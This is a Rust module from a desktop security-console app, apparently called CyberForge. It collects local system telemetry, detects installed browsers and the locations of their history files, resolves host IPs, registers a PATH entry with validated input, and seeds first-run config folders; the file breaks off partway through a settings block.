//! Local system telemetry — real data via `sysinfo`, no cloud round-trips.
//!
//! Two audiences read this module:
//!   * the floating agent panel + telemetry broadcaster — CPU / memory / uptime
//!     and installed/running browser detection (TTL cached in shared state so the
//!     many UI surfaces share one computation), and
//!   * the **installation wizard** — a richer, OS-aware machine profile plus the
//!     real "add CyberForge to the system PATH" action. The wizard is what
//!     surfaces real hardware, OS, browser and browser-history facts to the user
//!     instead of the old hard-coded placeholders.
//!
//! Everything here is computed on-device. Nothing in this file uploads system,
//! browser or history data anywhere — it is read locally and handed straight to
//! the local webview.

use crate::state::AppState;
// Address redaction is shared with the CLI and checked against the backend's
// and the phone's examples (cyberforge_core::redact).
pub(crate) use cyberforge_core::redact::redact_url;
use serde_json::{json, Value};
use std::path::Path;
use std::sync::Arc;
use std::time::{Duration, Instant};
use sysinfo::{Disks, Networks, System};
use tauri::State;
use tokio::sync::Mutex;

#[cfg(target_os = "windows")]
use std::os::windows::process::CommandExt;
/// Don't pop a console window when spawning helper processes from the GUI app.
#[cfg(target_os = "windows")]
const CREATE_NO_WINDOW: u32 = 0x0800_0000;

type SharedState = Arc<Mutex<AppState>>;

const SYS_TTL: Duration = Duration::from_millis(2500);
const BROWSERS_TTL: Duration = Duration::from_secs(15);
/// How long a background-collected history snapshot is served before a UI
/// command triggers a fresh collection (the startup task also refreshes it).
const HISTORY_TTL: Duration = Duration::from_secs(90);
/// Rows read per individual history database (per browser profile).
const HISTORY_PER_DB: usize = 5000;
/// Hard cap on the de-duplicated aggregate, to bound memory regardless of how
/// many profiles/browsers the machine has.
const HISTORY_CAP: usize = 20_000;

fn round1(x: f64) -> f64 {
    (x * 10.0).round() / 10.0
}

/// bytes → GiB (Windows/macOS display "GB" but mean GiB, so we match that).
fn b2gb(bytes: u64) -> f64 {
    bytes as f64 / 1_073_741_824.0
}

// ──────────────────────────────────────────────
// CPU / memory / uptime (agent panel + broadcaster)
// ──────────────────────────────────────────────

fn compute_system_stats() -> Value {
    let mut sys = System::new_all();
    sys.refresh_all();
    // sysinfo needs a second sample (after a short delay) for a real CPU figure.
    std::thread::sleep(Duration::from_millis(200));
    sys.refresh_all();

    let total_mem = sys.total_memory() as f64;
    let used_mem = sys.used_memory() as f64;
    let mem_percent = if total_mem > 0.0 { used_mem / total_mem * 100.0 } else { 0.0 };
    let cpu_usage: f64 = sys.cpus().iter().map(|c| c.cpu_usage() as f64).sum::<f64>()
        / sys.cpus().len().max(1) as f64;

    json!({
        "success": true,
        "data": {
            "cpu": (cpu_usage * 10.0).round() / 10.0,
            "memory": (mem_percent * 10.0).round() / 10.0,
            "uptime": System::uptime(),
            "cpu_count": sys.cpus().len(),
            "hostname": System::host_name().unwrap_or_else(|| "Unknown".into()),
        }
    })
}

// ──────────────────────────────────────────────
// OS-aware install target (used by the wizard)
// ──────────────────────────────────────────────

/// Where CyberForge installs by default + which directory we register on PATH,
/// per operating system. Everything is user-writable so PATH registration never
/// needs elevation. `bin` is always `<dir>/bin` so the UI default and any path
/// the user types stay consistent with [`join_bin`].
struct InstallTarget {
    dir: String,
    bin: String,
    path_label: String,
    kind: String,
}

fn default_install_target() -> InstallTarget {
    #[cfg(target_os = "windows")]
    {
        let base = std::env::var("LOCALAPPDATA").unwrap_or_else(|_| r"C:\Program Files".into());
        let dir = format!(r"{}\Programs\CyberForge", base);
        let bin = format!(r"{}\bin", dir);
        InstallTarget {
            dir,
            bin,
            path_label: "User Path environment variable".into(),
            kind: "windows".into(),
        }
    }
    #[cfg(target_os = "macos")]
    {
        let home = std::env::var("HOME").unwrap_or_else(|_| "/Applications".into());
        let dir = format!("{}/Applications/CyberForge", home);
        let bin = format!("{}/bin", dir);
        InstallTarget {
            dir,
            bin,
            path_label: "~/.zprofile (PATH export)".into(),
            kind: "macos".into(),
        }
    }
    #[cfg(target_os = "linux")]
    {
        let home = std::env::var("HOME").unwrap_or_else(|_| "/opt".into());
        let dir = format!("{}/.local/share/CyberForge", home);
        let bin = format!("{}/bin", dir);
        InstallTarget {
            dir,
            bin,
            path_label: "~/.profile (PATH export)".into(),
            kind: "linux".into(),
        }
    }
}

/// The PATH entry for the install folder a page passed (none: the default), or
/// why it cannot be one (SEC-05). The folder is added to the user's PATH, and on
/// macOS/Linux written into a shell profile inside `export PATH="$PATH:…"`, so
/// it must be a full local path with no `..`, no control characters, no PATH
/// separator, and on macOS/Linux none of the characters the shell would read
/// inside that double-quoted line (`"`, `$`, `` ` ``, `\`). Network (UNC) paths
/// are refused on Windows: commands found on PATH would run from another host.
fn checked_bin(install_dir: Option<&str>) -> Result<String, String> {
    let Some(dir) = install_dir.map(str::trim).filter(|d| !d.is_empty()) else {
        return Ok(default_install_target().bin);
    };
    let refuse = |why: &str| Err(format!("The install folder cannot be used: {why}."));
    if dir.chars().count() > 400 {
        return refuse("it is longer than 400 characters");
    }
    if dir.chars().any(char::is_control) {
        return refuse("it contains control characters");
    }
    let path = std::path::Path::new(dir);
    if !path.is_absolute() {
        return refuse("give a full path");
    }
    if path.components().any(|c| matches!(c, std::path::Component::ParentDir)) {
        return refuse("it contains \"..\"");
    }
    #[cfg(target_os = "windows")]
    {
        if dir.starts_with(r"\\") || dir.starts_with("//") {
            return refuse("network paths are not allowed");
        }
        if dir.contains(';') || dir.contains('"') {
            return refuse("it contains ; or \"");
        }
    }
    #[cfg(not(target_os = "windows"))]
    {
        if dir.chars().any(|c| matches!(c, ':' | '"' | '$' | '`' | '\\')) {
            return refuse("it contains one of : \" $ ` \\");
        }
    }
    Ok(join_bin(dir))
}

/// `<install dir>/bin` for whatever directory the user chose, normalised so we
/// never double up a trailing `bin` segment.
fn join_bin(dir: &str) -> String {
    let sep = std::path::MAIN_SEPARATOR;
    let trimmed = dir.trim().trim_end_matches(['/', '\\']);
    let already = trimmed
        .rsplit(['/', '\\'])
        .next()
        .map(|seg| seg.eq_ignore_ascii_case("bin"))
        .unwrap_or(false);
    if already {
        trimmed.to_string()
    } else {
        format!("{}{}bin", trimmed, sep)
    }
}

// ──────────────────────────────────────────────
// Rich machine profile (installation wizard)
// ──────────────────────────────────────────────

fn compute_system_profile() -> Value {
    let mut sys = System::new_all();
    sys.refresh_all();

    let os_name = System::name().unwrap_or_else(|| "Unknown".into());
    let os_pretty = System::long_os_version().unwrap_or_else(|| os_name.clone());
    let os_version = System::os_version().unwrap_or_default();
    let kernel = System::kernel_version().unwrap_or_default();
    let hostname = System::host_name().unwrap_or_else(|| "Unknown".into());
    let arch = std::env::consts::ARCH.to_string();
    let family = std::env::consts::OS.to_string();

    let cpu_brand = sys
        .cpus()
        .first()
        .map(|c| c.brand().trim().to_string())
        .filter(|s| !s.is_empty())
        .unwrap_or_else(|| "Processor".into());
    let cores = sys.cpus().len();

    let total_gb = b2gb(sys.total_memory());
    let used_gb = b2gb(sys.used_memory());

    let target = default_install_target();

    // Storage for the drive that hosts the install directory (fall back to the
    // largest disk if no mount point is a prefix of the install path).
    let disks = Disks::new_with_refreshed_list();
    let mut free_gb = 0.0_f64;
    let mut disk_total_gb = 0.0_f64;
    let mut matched = false;
    for d in disks.iter() {
        let mp = d.mount_point().to_string_lossy().to_string();
        if !mp.is_empty() && target.dir.starts_with(&mp) {
            let t = b2gb(d.total_space());
            if t > disk_total_gb {
                disk_total_gb = t;
                free_gb = b2gb(d.available_space());
                matched = true;
            }
        }
    }
    if !matched {
        for d in disks.iter() {
            let t = b2gb(d.total_space());
            if t > disk_total_gb {
                disk_total_gb = t;
                free_gb = b2gb(d.available_space());
            }
        }
    }

    let net_count = Networks::new_with_refreshed_list().iter().count();

    json!({
        "success": true,
        "data": {
            "os": {
                "name": os_name,
                "pretty": os_pretty,
                "version": os_version,
                "kernel": kernel,
                "family": family,
                "arch": arch.clone(),
            },
            "cpu": { "brand": cpu_brand, "cores": cores, "arch": arch },
            "memory": {
                "totalGb": round1(total_gb),
                "usedGb": round1(used_gb),
                "label": format!("{} GB", total_gb.round() as u64),
            },
            "storage": {
                "freeGb": round1(free_gb),
                "totalGb": round1(disk_total_gb),
                "label": format!(
                    "{} GB free / {} GB",
                    free_gb.round() as u64,
                    disk_total_gb.round() as u64
                ),
            },
            "network": { "interfaces": net_count },
            "hostname": hostname,
            "install": {
                "dir": target.dir,
                "bin": target.bin,
                "pathLabel": target.path_label,
                "kind": target.kind,
            }
        }
    })
}

// ──────────────────────────────────────────────
// Cross-platform browser + history detection
// ──────────────────────────────────────────────

/// A browser we know how to detect: process-name fragments, candidate install
/// executables, and candidate history-database locations (all already expanded
/// to absolute paths for this OS). `firefox` flips the history lookup to scan a
/// `Profiles` directory for `places.sqlite`.
struct BrowserDef {
    key: &'static str,
    name: &'static str,
    proc_needles: &'static [&'static str],
    exe_paths: Vec<String>,
    history_paths: Vec<String>,
    firefox: bool,
}

struct HistFile {
    path: String,
    size: u64,
    modified: i64,
}

fn stat_hist(p: &str) -> Option<HistFile> {
    let md = std::fs::metadata(p).ok()?;
    let modified = md
        .modified()
        .ok()
        .and_then(|t| t.duration_since(std::time::UNIX_EPOCH).ok())
        .map(|d| d.as_secs() as i64)
        .unwrap_or(0);
    Some(HistFile { path: p.to_string(), size: md.len(), modified })
}

/// Locate a browser's history database. Reading the *contents* needs SQLite
/// (and the file is usually locked while the browser runs), so we deliberately
/// only confirm the database exists and report its size + last-modified time —
/// enough to prove "history detected, on-device" without ever opening it.
/// Whether any supported browser's history file can be found on this computer
/// (what a device heartbeat reports as `browser_history`).
pub fn collected_history_available() -> bool {
    browser_defs().iter().any(|d| locate_history(d).is_some())
}

fn locate_history(d: &BrowserDef) -> Option<HistFile> {
    if d.firefox {
        let dir = d.history_paths.first()?;
        for entry in std::fs::read_dir(dir).ok()?.flatten() {
            let cand = entry.path().join("places.sqlite");
            if cand.exists() {
                if let Some(s) = cand.to_str() {
                    if let Some(h) = stat_hist(s) {
                        return Some(h);
                    }
                }
            }
        }
        None
    } else {
        d.history_paths.iter().find_map(|p| stat_hist(p))
    }
}

#[cfg(target_os = "windows")]
fn browser_defs() -> Vec<BrowserDef> {
    let pf = std::env::var("ProgramFiles").unwrap_or_else(|_| r"C:\Program Files".into());
    let pf86 =
        std::env::var("ProgramFiles(x86)").unwrap_or_else(|_| r"C:\Program Files (x86)".into());
    let lad = std::env::var("LOCALAPPDATA").unwrap_or_default();
    let ad = std::env::var("APPDATA").unwrap_or_default();
    vec![
        BrowserDef {
            key: "chrome",
            name: "Google Chrome",
            proc_needles: &["chrome"],
            firefox: false,
            exe_paths: vec![
                format!(r"{}\Google\Chrome\Application\chrome.exe", pf),
                format!(r"{}\Google\Chrome\Application\chrome.exe", pf86),
                format!(r"{}\Google\Chrome\Application\chrome.exe", lad),
            ],
            history_paths: vec![format!(r"{}\Google\Chrome\User Data\Default\History", lad)],
        },
        BrowserDef {
            key: "edge",
            name: "Microsoft Edge",
            proc_needles: &["msedge"],
            firefox: false,
            exe_paths: vec![
                format!(r"{}\Microsoft\Edge\Application\msedge.exe", pf86),
                format!(r"{}\Microsoft\Edge\Application\msedge.exe", pf),
            ],
            history_paths: vec![format!(r"{}\Microsoft\Edge\User Data\Default\History", lad)],
        },
        BrowserDef {
            key: "firefox",
            name: "Firefox",
            proc_needles: &["firefox"],
            firefox: true,
            exe_paths: vec![
                format!(r"{}\Mozilla Firefox\firefox.exe", pf),
                format!(r"{}\Mozilla Firefox\firefox.exe", pf86),
            ],
            history_paths: vec![format!(r"{}\Mozilla\Firefox\Profiles", ad)],
        },
        BrowserDef {
            key: "brave",
            name: "Brave",
            proc_needles: &["brave"],
            firefox: false,
            exe_paths: vec![
                format!(r"{}\BraveSoftware\Brave-Browser\Application\brave.exe", lad),
                format!(r"{}\BraveSoftware\Brave-Browser\Application\brave.exe", pf),
                format!(r"{}\BraveSoftware\Brave-Browser\Application\brave.exe", pf86),
            ],
            history_paths: vec![format!(
                r"{}\BraveSoftware\Brave-Browser\User Data\Default\History",
                lad
            )],
        },
        BrowserDef {
            key: "opera",
            name: "Opera",
            proc_needles: &["opera"],
            firefox: false,
            exe_paths: vec![format!(r"{}\Programs\Opera\opera.exe", lad)],
            history_paths: vec![format!(r"{}\Opera Software\Opera Stable\History", ad)],
        },
    ]
}

#[cfg(target_os = "macos")]
fn browser_defs() -> Vec<BrowserDef> {
    let home = std::env::var("HOME").unwrap_or_default();
    vec![
        BrowserDef {
            key: "chrome",
            name: "Google Chrome",
            proc_needles: &["google chrome"],
            firefox: false,
            exe_paths: vec!["/Applications/Google Chrome.app".into()],
            history_paths: vec![format!(
                "{}/Library/Application Support/Google/Chrome/Default/History",
                home
            )],
        },
        BrowserDef {
            key: "safari",
            name: "Safari",
            proc_needles: &["safari"],
            firefox: false,
            exe_paths: vec!["/Applications/Safari.app".into()],
            history_paths: vec![format!("{}/Library/Safari/History.db", home)],
        },
        BrowserDef {
            key: "edge",
            name: "Microsoft Edge",
            proc_needles: &["microsoft edge", "msedge"],
            firefox: false,
            exe_paths: vec!["/Applications/Microsoft Edge.app".into()],
            history_paths: vec![format!(
                "{}/Library/Application Support/Microsoft Edge/Default/History",
                home
            )],
        },
        BrowserDef {
            key: "firefox",
            name: "Firefox",
            proc_needles: &["firefox"],
            firefox: true,
            exe_paths: vec!["/Applications/Firefox.app".into()],
            history_paths: vec![format!("{}/Library/Application Support/Firefox/Profiles", home)],
        },
        BrowserDef {
            key: "brave",
            name: "Brave",
            proc_needles: &["brave"],
            firefox: false,
            exe_paths: vec!["/Applications/Brave Browser.app".into()],
            history_paths: vec![format!(
                "{}/Library/Application Support/BraveSoftware/Brave-Browser/Default/History",
                home
            )],
        },
    ]
}

#[cfg(target_os = "linux")]
fn browser_defs() -> Vec<BrowserDef> {
    let home = std::env::var("HOME").unwrap_or_default();
    vec![
        BrowserDef {
            key: "chrome",
            name: "Google Chrome",
            proc_needles: &["chrome"],
            firefox: false,
            exe_paths: vec![
                "/usr/bin/google-chrome".into(),
                "/usr/bin/google-chrome-stable".into(),
                "/opt/google/chrome/chrome".into(),
            ],
            history_paths: vec![format!("{}/.config/google-chrome/Default/History", home)],
        },
        BrowserDef {
            key: "chromium",
            name: "Chromium",
            proc_needles: &["chromium"],
            firefox: false,
            exe_paths: vec!["/usr/bin/chromium".into(), "/usr/bin/chromium-browser".into()],
            history_paths: vec![format!("{}/.config/chromium/Default/History", home)],
        },
        BrowserDef {
            key: "firefox",
            name: "Firefox",
            proc_needles: &["firefox"],
            firefox: true,
            exe_paths: vec!["/usr/bin/firefox".into(), "/usr/lib/firefox/firefox".into()],
            history_paths: vec![format!("{}/.mozilla/firefox", home)],
        },
        BrowserDef {
            key: "brave",
            name: "Brave",
            proc_needles: &["brave"],
            firefox: false,
            exe_paths: vec![
                "/usr/bin/brave-browser".into(),
                "/opt/brave.com/brave/brave".into(),
            ],
            history_paths: vec![format!(
                "{}/.config/BraveSoftware/Brave-Browser/Default/History",
                home
            )],
        },
    ]
}

/// Look up a browser's install path from the Windows registry "App Paths" keys
/// (HKCU then HKLM). This is the authoritative location regardless of where the
/// browser was installed, so it catches browsers the hard-coded path list misses.
#[cfg(target_os = "windows")]
fn registry_app_path(exe: &str) -> Option<String> {
    for root in ["HKCU", "HKLM"] {
        let key = format!(
            r"{}\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\{}",
            root, exe
        );
        if let Ok(out) = std::process::Command::new("reg")
            .args(["query", &key, "/ve"])
            .creation_flags(CREATE_NO_WINDOW)
            .output()
        {
            if out.status.success() {
                let text = String::from_utf8_lossy(&out.stdout);
                for line in text.lines() {
                    if let Some(idx) = line.find("REG_SZ") {
                        let val = line[idx + "REG_SZ".len()..].trim().trim_matches('"');
                        if !val.is_empty() && Path::new(val).exists() {
                            return Some(val.to_string());
                        }
                    }
                }
            }
        }
    }
    None
}

/// Resolve a browser's install path: known file locations first, then (on
/// Windows) the registry App Paths keyed by the executable name.
fn find_install(d: &BrowserDef) -> Option<String> {
    if let Some(p) = d.exe_paths.iter().find(|p| Path::new(p).exists()) {
        return Some(p.clone());
    }
    #[cfg(target_os = "windows")]
    if let Some(first) = d.exe_paths.first() {
        if let Some(base) = Path::new(first).file_name().and_then(|s| s.to_str()) {
            if let Some(p) = registry_app_path(base) {
                return Some(p);
            }
        }
    }
    None
}

/// Canonical Windows process list via `tasklist`, used to back up sysinfo's
/// enumeration (which can come back thin in some packaged GUI contexts). Returns
/// lowercased image names like "chrome.exe".
#[cfg(target_os = "windows")]
fn tasklist_processes() -> Vec<String> {
    std::process::Command::new("tasklist")
        .args(["/fo", "csv", "/nh"])
        .creation_flags(CREATE_NO_WINDOW)
        .output()
        .ok()
        .filter(|o| o.status.success())
        .map(|o| {
            String::from_utf8_lossy(&o.stdout)
                .lines()
                .filter_map(|l| l.split(',').next())
                .map(|s| s.trim().trim_matches('"').to_lowercase())
                .collect()
        })
        .unwrap_or_default()
}

fn compute_browsers() -> Value {
    let mut sys = System::new_all();
    sys.refresh_all();

    let mut running: Vec<String> = sys
        .processes()
        .values()
        .map(|p| p.name().to_string_lossy().to_lowercase())
        // Drop the WebView2 runtime ("msedgewebview2.exe") — it's used by this very
        // Tauri app (and Teams, VS Code, etc.), so matching "msedge" against it
        // would make Microsoft Edge always look like it's running.
        .filter(|n| !n.contains("webview2"))
        .collect();
    // Belt-and-suspenders on Windows: union sysinfo's list with `tasklist`, so a
    // running browser is detected even if sysinfo enumeration is incomplete.
    #[cfg(target_os = "windows")]
    {
        for n in tasklist_processes() {
            if !n.contains("webview2") {
                running.push(n);
            }
        }
    }
    let is_running =
        |needles: &[&str]| needles.iter().any(|n| running.iter().any(|p| p.contains(*n)));

    let defs = browser_defs();
    let mut browsers = Vec::new();
    let mut installed_count = 0u32;
    let mut running_count = 0u32;
    let mut with_history = 0u32;

    for d in &defs {
        let run = is_running(d.proc_needles);
        let exe = find_install(d);
        let installed = exe.is_some() || run;
        if !installed {
            continue;
        }
        installed_count += 1;
        if run {
            running_count += 1;
        }

        let hist = locate_history(d);
        if hist.is_some() {
            with_history += 1;
        }
        let (hist_avail, hist_path, hist_size, hist_mod) = match &hist {
            Some(h) => (true, h.path.clone(), h.size, h.modified),
            None => (false, String::new(), 0u64, 0i64),
        };

        browsers.push(json!({
            "key": d.key,
            "name": d.name,
            "isInstalled": true,
            "isRunning": run,
            "version": "",
            "installPath": exe.unwrap_or_default(),
            "historyAvailable": hist_avail,
            "historyPath": hist_path,
            "historySizeBytes": hist_size,
            "historyModified": hist_mod,
        }));
    }

    // Dev visibility: prints to the `npm run dev` terminal each time detection
    // runs, so it's obvious what the REAL app (not just `cargo test`) sees.
    #[cfg(debug_assertions)]
    {
        let names: Vec<String> = browsers
            .iter()
            .map(|b| {
                format!(
                    "{}{}",
                    b.get("name").and_then(|v| v.as_str()).unwrap_or("?"),
                    if b.get("isRunning").and_then(|v| v.as_bool()).unwrap_or(false) {
                        "*"
                    } else {
                        ""
                    }
                )
            })
            .collect();
        eprintln!(
            "[cyberforge] detect_browsers (os={}): installed={} running={} [{}]",
            std::env::consts::OS,
            installed_count,
            running_count,
            names.join(", ")
        );
    }

    json!({
        "success": true,
        "data": {
            "browsers": browsers,
            "installed": installed_count,
            "running": running_count,
            "withHistory": with_history,
        }
    })
}

// ──────────────────────────────────────────────
// PATH registration (installation wizard)
// ──────────────────────────────────────────────

/// Is `bin` already on the *current process* PATH? (A freshly written user PATH
/// won't show here until the next login — this only reports pre-existing entries
/// so the wizard can pre-tick the toggle when nothing needs doing.)
fn path_contains(bin: &str) -> bool {
    let sep = if cfg!(windows) { ';' } else { ':' };
    std::env::var("PATH")
        .map(|p| p.split(sep).any(|e| e.eq_ignore_ascii_case(bin)))
        .unwrap_or(false)
}

#[cfg(target_os = "windows")]
const PS_ADD_PATH: &str = r#"
$b = $env:CF_BIN
$p = [Environment]::GetEnvironmentVariable('Path','User')
if ($null -eq $p) { $p = '' }
$parts = @($p -split ';' | Where-Object { $_ -ne '' })
if ($parts -contains $b) { 'EXISTS' }
else {
  if ([string]::IsNullOrEmpty($p)) { $np = $b } else { $np = $p.TrimEnd(';') + ';' + $b }
  [Environment]::SetEnvironmentVariable('Path', $np, 'User')
  'ADDED'
}
"#;

/// Append `bin` to the user PATH. The bin directory is passed via an env var so
/// there is no string interpolation (and therefore no command injection) into
/// the PowerShell snippet. Writing the `User` scope persists across sessions and
/// broadcasts `WM_SETTINGCHANGE`, all without administrator rights.
#[cfg(target_os = "windows")]
fn add_bin_to_path(bin: &str) -> Result<String, String> {
    let _ = std::fs::create_dir_all(bin);
    let out = std::process::Command::new("powershell")
        .args([
            "-NoProfile",
            "-NonInteractive",
            "-ExecutionPolicy",
            "Bypass",
            "-Command",
            PS_ADD_PATH,
        ])
        .env("CF_BIN", bin)
        .creation_flags(CREATE_NO_WINDOW)
        .output()
        .map_err(|e| format!("powershell failed: {}", e))?;
    if !out.status.success() {
        return Err(String::from_utf8_lossy(&out.stderr).trim().to_string());
    }
    let s = String::from_utf8_lossy(&out.stdout);
    Ok(if s.contains("ADDED") { "ADDED".into() } else { "EXISTS".into() })
}

/// Append `export PATH=...` to the login shell profile (idempotent: skipped if
/// the bin directory is already referenced there).
#[cfg(not(target_os = "windows"))]
fn add_bin_to_path(bin: &str) -> Result<String, String> {
    use std::io::Write;
    let _ = std::fs::create_dir_all(bin);
    let home = std::env::var("HOME").map_err(|_| "HOME not set".to_string())?;
    let profile = if cfg!(target_os = "macos") {
        format!("{}/.zprofile", home)
    } else {
        format!("{}/.profile", home)
    };
    let existing = std::fs::read_to_string(&profile).unwrap_or_default();
    if existing.contains(bin) {
        return Ok("EXISTS".into());
    }
    let line = format!("\n# Added by CyberForge installer\nexport PATH=\"$PATH:{}\"\n", bin);
    let mut f = std::fs::OpenOptions::new()
        .create(true)
        .append(true)
        .open(&profile)
        .map_err(|e| e.to_string())?;
    f.write_all(line.as_bytes()).map_err(|e| e.to_string())?;
    Ok("ADDED".into())
}

// ──────────────────────────────────────────────
// Cached snapshots shared by the command + broadcaster
// ──────────────────────────────────────────────

/// Cached CPU/memory/uptime snapshot. Shared by the command and the broadcaster.
pub async fn system_data(state: &SharedState) -> Value {
    {
        let s = state.lock().await;
        if let Some((t, v)) = &s.sys_cache {
            if t.elapsed() < SYS_TTL {
                return v.clone();
            }
        }
    }
    let result = compute_system_stats();
    {
        let mut s = state.lock().await;
        s.sys_cache = Some((Instant::now(), result.clone()));
    }
    result
}

/// Cached browser detection.
pub async fn browsers_data(state: &SharedState) -> Value {
    {
        let s = state.lock().await;
        if let Some((t, v)) = &s.browsers_cache {
            if t.elapsed() < BROWSERS_TTL {
                return v.clone();
            }
        }
    }
    let result = compute_browsers();
    {
        let mut s = state.lock().await;
        s.browsers_cache = Some((Instant::now(), result.clone()));
    }
    result
}

// ──────────────────────────────────────────────
// Tauri commands
// ──────────────────────────────────────────────

#[tauri::command]
pub async fn get_system_stats(state: State<'_, SharedState>) -> Result<Value, String> {
    Ok(system_data(state.inner()).await)
}

/// Resolve a website/host to its IP address(es) via the OS DNS resolver.
/// Powers the header search ("type a website → get its IP"). The blocking
/// `to_socket_addrs` lookup runs off the async runtime via `spawn_blocking`.
#[tauri::command]
pub async fn resolve_ip(host: String) -> Result<Value, String> {
    // Normalize input → bare hostname (strip scheme, path, query, userinfo, port).
    let mut h = host.trim();
    if let Some(p) = h.find("://") {
        h = &h[p + 3..];
    }
    h = h.split('/').next().unwrap_or(h);
    h = h.split('?').next().unwrap_or(h);
    if let Some(at) = h.rfind('@') {
        h = &h[at + 1..];
    }
    let hostname = h.split(':').next().unwrap_or(h).trim().trim_matches('.').to_string();
    if hostname.len() > 253 || hostname.chars().any(|c| c.is_whitespace() || c.is_control()) {
        return Ok(json!({ "success": false, "error": "That is not a host name" }));
    }
    if hostname.is_empty() {
        return Ok(json!({ "success": false, "error": "Enter a website or domain" }));
    }

    let lookup = hostname.clone();
    let joined = tokio::task::spawn_blocking(move || {
        use std::net::{IpAddr, ToSocketAddrs};
        match (lookup.as_str(), 443u16).to_socket_addrs() {
            Ok(iter) => {
                let mut v4: Vec<String> = Vec::new();
                let mut v6: Vec<String> = Vec::new();
                for sa in iter {
                    match sa.ip() {
                        IpAddr::V4(a) => {
                            let s = a.to_string();
                            if !v4.contains(&s) {
                                v4.push(s);
                            }
                        }
                        IpAddr::V6(a) => {
                            let s = a.to_string();
                            if !v6.contains(&s) {
                                v6.push(s);
                            }
                        }
                    }
                }
                Ok((v4, v6))
            }
            Err(e) => Err(e.to_string()),
        }
    })
    .await;

    match joined {
        Ok(Ok((v4, v6))) => {
            if v4.is_empty() && v6.is_empty() {
                Ok(json!({ "success": false, "host": hostname, "error": "No DNS records found" }))
            } else {
                let primary = v4.first().or_else(|| v6.first()).cloned().unwrap_or_default();
                Ok(json!({
                    "success": true,
                    "host": hostname,
                    "ip": primary,
                    "ipv4": v4,
                    "ipv6": v6,
                    "count": v4.len() + v6.len()
                }))
            }
        }
        Ok(Err(e)) => Ok(json!({ "success": false, "host": hostname, "error": format!("Could not resolve \u{201c}{}\u{201d}: {}", hostname, e) })),
        Err(e) => Ok(json!({ "success": false, "host": hostname, "error": format!("Lookup failed: {}", e) })),
    }
}

#[tauri::command]
pub async fn detect_browsers(state: State<'_, SharedState>) -> Result<Value, String> {
    Ok(browsers_data(state.inner()).await)
}

/// Full OS-aware machine profile for the installation wizard (OS, CPU, memory,
/// storage, network, and the OS-correct default install directory + PATH bin).
#[tauri::command]
pub async fn get_system_profile() -> Result<Value, String> {
    Ok(compute_system_profile())
}

/// Report whether the CyberForge bin directory is already on PATH.
#[tauri::command]
pub async fn get_path_status(install_dir: Option<String>) -> Result<Value, String> {
    let bin = checked_bin(install_dir.as_deref())?;
    Ok(json!({ "success": true, "bin": bin, "present": path_contains(&bin) }))
}

/// Add `<install_dir>/bin` (or the OS default) to the user PATH. Idempotent and
/// elevation-free; the bin directory is created so the PATH entry is valid.
#[tauri::command]
pub async fn add_to_path(install_dir: Option<String>) -> Result<Value, String> {
    let bin = checked_bin(install_dir.as_deref())?;
    let status = add_bin_to_path(&bin)?;
    Ok(json!({
        "success": true,
        "bin": bin,
        "status": status,
        "added": status == "ADDED",
        "alreadyPresent": status == "EXISTS",
    }))
}

// ──────────────────────────────────────────────
// First-run filesystem preparation
// ──────────────────────────────────────────────

/// Create the full per-user CyberForge filesystem so the app is properly
/// integrated with the OS right after installation — the standard config / data
/// / cache / log directories the platform expects, a complete sub-folder layout
/// (config, logs, cache, intel, quarantine, reports, models, backups, profiles),
/// and seeded configuration + manifest + log files.
///
/// Runs on every launch but only writes files/dirs that are missing, so it is
/// safe and idempotent. The live stores managed by other modules — the vector
/// memory (`memories.json`), the block/protect/allow lists, and `session.json`
/// — are created on first write by those modules and are NEVER overwritten here.
pub fn prepare_filesystem(app: &tauri::AppHandle) {
    use tauri::Manager;

    let Ok(dir) = app.path().app_config_dir() else {
        return;
    };
    if std::fs::create_dir_all(&dir).is_err() {
        return;
    }

    let now = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .map(|d| d.as_secs())
        .unwrap_or(0);
    let os = std::env::consts::OS;
    let arch = std::env::consts::ARCH;

    // helpers ----------------------------------------------------------------
    let mkdir = |p: &std::path::Path| {
        let _ = std::fs::create_dir_all(p);
    };
    let seed = |p: std::path::PathBuf, body: &str| {
        if !p.exists() {
            if let Some(parent) = p.parent() {
                let _ = std::fs::create_dir_all(parent);
            }
            let _ = std::fs::write(&p, body);
        }
    };

    // 1) Standard OS-integrated locations (config / data / cache / log /
    //    local-data). On some platforms several of these resolve to the same
    //    path; create_dir_all is idempotent so that is fine.
    for d in [
        app.path().app_data_dir().ok(),
        app.path().app_cache_dir().ok(),
        app.path().app_log_dir().ok(),
        app.path().app_local_data_dir().ok(),
    ]
    .into_iter()
    .flatten()
    {
        mkdir(&d);
    }

    // 2) Full sub-folder layout inside the main data directory.
    let subdirs = [
        "config",     // user + default settings, preferences, policies, integrations
        "logs",       // application + audit logs
        "cache",      // transient scan/render cache
        "intel",      // threat-intelligence cache (OTX pulses, indicators)
        "quarantine", // artifacts from blocked / flagged sites
        "reports",    // saved report exports
        "models",     // ML model registry + metadata
        "backups",    // rolling config backups
        "profiles",   // per-browser collected-history working area
        "rules",      // detection rule sets
    ];
    for s in subdirs {
        let p = dir.join(s);
        mkdir(&p);
        // Keep empty dirs present + self-describing.
        seed(
            p.join(".keep"),
            "This directory is managed by CyberForge. Safe to leave empty.\n",
        );
    }

    // 3) Import slot for a Hugging Face token. Seeded EMPTY. The token itself is
    //    kept in the system credential store (see auth.rs): one pasted here is
    //    moved there at the next start and removed from this file.
    seed(
        dir.join("hf_config.json"),
        "{\n  \"_comment\": \"The Hugging Face token is kept in the system credential store, not in this file. Save it from Settings -> AI & Models, or paste it in \\\"active\\\" and restart: it is moved to the credential store and removed from this file.\",\n  \"active\": \"\",\n  \"tokens\": []\n}\n",
    );

    // 4) Application manifest — an integration descriptor for the install.
    let manifest = serde_json::json!({
        "name": "CyberForge",
        "product": "CyberForge - AI Security Console",
        "identifier": "com.cyberforge.console",
        "version": env!("CARGO_PKG_VERSION"),
        "kind": "desktop-security-console",
        "localFirst": true,
        "os": os,
        "arch": arch,
        "dataDir": dir.to_string_lossy(),
        "createdAt": now,
        "directories": subdirs,
        "managedFiles": [
            "memories.json", "blocklist.json", "protected.json",
            "allowed.json", "session.json", "install.json"
        ]
    });
    seed(
        dir.join("manifest.json"),
        &serde_json::to_string_pretty(&manifest).unwrap_or_else(|_| "{}".into()),
    );
    seed(dir.join("version"), &format!("{}\n", env!("CARGO_PKG_VERSION")));

    // 5) Default settings (real, capability-backed toggles).
    seed(
        dir.join("config").join("settings.json"),
        &serde_json::to_string_pretty(&serde_json::json!({
            "schemaVersion": 1,
